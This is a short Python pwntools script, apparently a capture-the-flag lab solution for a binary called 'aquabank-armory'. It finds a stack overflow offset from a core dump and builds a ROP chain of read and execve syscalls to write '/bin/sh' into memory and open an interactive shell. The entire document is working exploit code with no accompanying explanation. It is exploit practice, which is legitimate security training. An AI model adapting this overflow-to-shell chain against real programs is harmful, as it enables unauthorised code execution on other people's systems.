from pwn import *

HOST = "offsec.m0lecon.it"
PORT = 13500

context.binary = elf = ELF("/home/kali/Desktop/offsec/ctf/lab3_4_recap/aquabank-armory", checksec=False)
libc = ELF('/home/kali/Desktop/offsec/ctf/lab3_4_recap/libc.so.6', checksec=False)

def find_ret_offset():
    p = process(elf.path)
    p.recvuntil(b"weapons:\n")
    p.sendline(cyclic(200))
    p.wait()

    core = p.corefile
    crash_val = core.read(core.rsp, 4) #to read what's inside the address in the stack pointed by the sp
    #crash_val = core.rax #if for example the crash value is directly in a register, not in the address pointed by the register

    offset = cyclic_find(crash_val)

    return offset

offset_to_rip = find_ret_offset()

#PIE OFF
rop = ROP(elf)
ret_gadget = rop.find_gadget(['ret'])[0]
pop_rax_ret_gadget = rop.find_gadget(['pop rax', 'ret'])[0]
pop_rdi_ret_gadget = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi_ret_gadget = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx_ret_gadget = rop.find_gadget(['pop rdx', 'ret'])[0]
syscall_ret_gadget = rop.find_gadget(['syscall', 'ret'])[0]

#bin_sh_addr = next(elf.search(b'/bin/sh\x00'))
bin_sh_addr = elf.bss() + 0x100

payload = flat(
    b"A"*offset_to_rip, 

    # read(0, binsh_addr, 8), read is syscall number 0
    p64(pop_rax_ret_gadget), p64(0),
    p64(pop_rdi_ret_gadget), p64(0),
    p64(pop_rsi_ret_gadget), p64(bin_sh_addr),
    p64(pop_rdx_ret_gadget), p64(8),
    p64(syscall_ret_gadget),


    #call execve("/bin/sh", NULL, NULL), execve is syscall number 59
    p64(pop_rax_ret_gadget), p64(59),
    p64(pop_rdi_ret_gadget), p64(bin_sh_addr),
    p64(pop_rsi_ret_gadget), p64(0),
    p64(pop_rdx_ret_gadget), p64(0),
    p64(syscall_ret_gadget),
)

p = process(elf.path)

p.recvuntil(b'weapons:\n')
p.send(payload)
p.send(b"/bin/sh\x00") 
p.interactive()